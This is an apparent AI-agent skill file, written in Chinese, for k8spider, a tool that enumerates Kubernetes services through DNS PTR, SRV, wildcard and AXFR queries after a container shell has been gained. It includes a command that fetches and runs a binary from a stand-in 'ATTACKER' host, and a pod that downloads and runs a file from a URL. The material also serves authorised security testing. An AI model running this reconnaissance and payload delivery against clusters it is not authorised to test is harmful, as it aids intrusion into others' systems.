---
name: k8spider
description: "使用 k8spider 进行 Kubernetes 集群 DNS 服务发现与侦察。当需要低权限枚举 K8s 集群中的 Service、探测 DNS 服务、扫描网段 PTR/SRV 记录、尝试 AXFR 区域传输时使用。k8spider 仅需 DNS 访问权限即可发现集群内所有服务，无需 API Server 权限。涉及 K8s 服务发现、DNS 侦察、集群信息收集、PTR 扫描、SRV 枚举的场景使用此技能。当用户提到 k8spider、K8s DNS 枚举、集群服务扫描、DNS 区域传输时也应触发"
metadata:
  tags: "k8spider,kubernetes,k8s,dns,service discovery,PTR,SRV,AXFR,recon,侦察,服务发现,集群扫描"
  category: "tool"
---

# K8Spider — Kubernetes DNS 服务发现

k8spider 是一个基于 DNS 的 K8s 服务发现工具——**只需能访问集群 DNS，即可低权限枚举所有 Service**。无需 API Server Token，无需特殊权限，纯 DNS 查询搞定。

项目地址：https://github.com/Esonhugh/k8spider

## 第一步：直接运行（使用默认参数）

k8spider 会从 `/etc/resolv.conf` 自动读取 DNS 服务器地址，使用内置默认 CIDR。先直接跑：

```bash
k8spider all
```

如果有输出，说明默认参数命中了，直接进入分析环节。

## 第二步：默认参数无结果时，手动收集网络信息

如果 `k8spider all` 没有发现任何信息，说明默认 CIDR 或 DNS 不对，需要从当前机器收集真实参数。

### 确定目标 CIDR（-c 参数）

CIDR 网段需要从当前容器的网络配置中提取：

```bash
# 方式 1：从环境变量获取（K8s 注入）
echo $KUBERNETES_SERVICE_HOST
# 返回的 IP 所在网段通常就是 Service CIDR 范围

# 方式 2：从 IP 地址推断
ip addr show  # 或 ifconfig
# 找到容器自身 IP 和掩码，推断所在网段

# 方式 3：从路由表推断
ip route
# 查看路由信息，推断集群网段范围
```

Pod 网段和 Service 网段通常是相邻的 /16，可从容器自身 IP 推断 Service CIDR 的可能范围。

### 确定并验证 DNS 服务器（-d 参数）

DNS 地址必须通过可靠方式找到并验证可用：

```bash
# 方式 1：从 resolv.conf 读取（最可靠）
cat /etc/resolv.conf
# nameserver 行就是集群 DNS 地址

# 方式 2：用 k8spider 自带命令定位
k8spider whereisdns

# 验证 DNS 是否可达且响应
nslookup kubernetes.default.svc.cluster.local <DNS_IP>
# 或
dig @<DNS_IP> kubernetes.default.svc.cluster.local
# 有正常应答说明 DNS 可用
```

验证通过后再指定 DNS 运行：

```bash
k8spider all -d <DNS_IP> -c <CIDR>
```

## 核心命令

### 全量扫描（推荐首选）

一键跑完所有发现方式，获取最全面的服务列表：

```bash
# 先用默认参数试
k8spider all

# 默认不生效时，用手动收集的参数
k8spider all -c <CIDR> -d <DNS_IP>

# 输出示例：
# [PTR] 10.43.0.10 -> dns-default.kube-system.svc.cluster.local
# [PTR] 10.43.0.1 -> kube-dns.kube-system.svc.cluster.local
# [SRV] _http._tcp.kubernetes.default.svc.cluster.local -> 10.43.0.1:443
```

### PTR 记录扫描（反向 DNS）

通过 IP 反查域名，逐 IP 扫描网段：

```bash
k8spider ptr -c <CIDR>
```

PTR 扫描的逻辑：对 CIDR 中每个 IP 发起反向 DNS 查询，K8s DNS 会返回 `svc-name.namespace.svc.cluster.local` 格式的域名，直接暴露服务名和命名空间。

### SRV 记录枚举

查询 DNS SRV 记录发现服务端口：

```bash
k8spider srv -c <CIDR> -z cluster.local
```

### 通配符 DNS 查询

利用 K8s DNS 的通配符解析特性发现服务：

```bash
k8spider wild -c <CIDR> -z cluster.local
```

### AXFR 区域传输

尝试 DNS 区域传输，一次获取整个 zone 的所有记录：

```bash
k8spider axfr -z cluster.local -d <DNS_IP>
```

注意：AXFR 通常被限制，但值得一试——如果成功，这是最快最全的方式。

### 同网段扫描

发现 DNS 服务所在子网的服务：

```bash
k8spider neighbor -d <DNS_IP>
```

### 子网计算与扫描

自动计算 DNS 服务所在子网并扫描：

```bash
k8spider subnet -d <DNS_IP>
```

### kube-state-metrics 解析

从 kube-state-metrics 端点提取服务信息：

```bash
k8spider metrics
```

## 全局选项

| 选项 | 说明 | 默认值 |
|------|------|--------|
| `-c` | 目标 CIDR 网段 | 内置默认值，视环境而定 |
| `-z` | DNS zone 名称 | `cluster.local` |
| `-d` | DNS 服务器地址 | 从 resolv.conf 读取 |
| `-t` | 启用多线程 | 关闭 |
| `-n` | 线程数 | 10 |

## 使用场景

### 场景 1：Pod 内使用（已拿到容器 shell）

```bash
# 投递二进制到容器
curl -o /tmp/k8spider https://ATTACKER/k8spider && chmod +x /tmp/k8spider

# 直接用默认参数跑
/tmp/k8spider all

# 没结果再收集网络信息手动指定
```

### 场景 2：通过 kubectl 使用

```bash
# 在现有 Pod 中执行
kubectl exec -it target-pod -- ./k8spider all

# 或创建临时 Pod
kubectl run k8spider --image=busybox --restart=Never -- \
  wget -O /tmp/k8spider URL && /tmp/k8spider all
```

### 场景 3：远程使用（需 DNS 可达）

```bash
# 必须手动指定 -d 和 -c，远程环境下默认参数基本不适用
k8spider all -c <CIDR> -d <DNS_IP> -z cluster.local
```

## 决策树

```
进入容器后：
├─ 第一步：k8spider all（直接用默认参数跑）
├─ 有结果 → 分析输出，拿到服务列表
├─ 无结果 → 收集网络信息
│   ├─ 获取 CIDR：从 ip addr / ifconfig / 环境变量推断
│   ├─ 获取 DNS：cat /etc/resolv.conf 或 k8spider whereisdns
│   └─ 验证 DNS：nslookup kubernetes.default.svc.cluster.local <DNS_IP>
├─ 用收集到的参数重跑：k8spider all -c <CIDR> -d <DNS_IP>
├─ 想要端口信息 → k8spider srv
├─ 赌一把全量 → k8spider axfr
├─ 想快速发现 → k8spider neighbor / k8spider subnet
├─ 有 metrics 端点 → k8spider metrics
└─ 网段大、速度慢 → 加 -t -n 50 开多线程
```
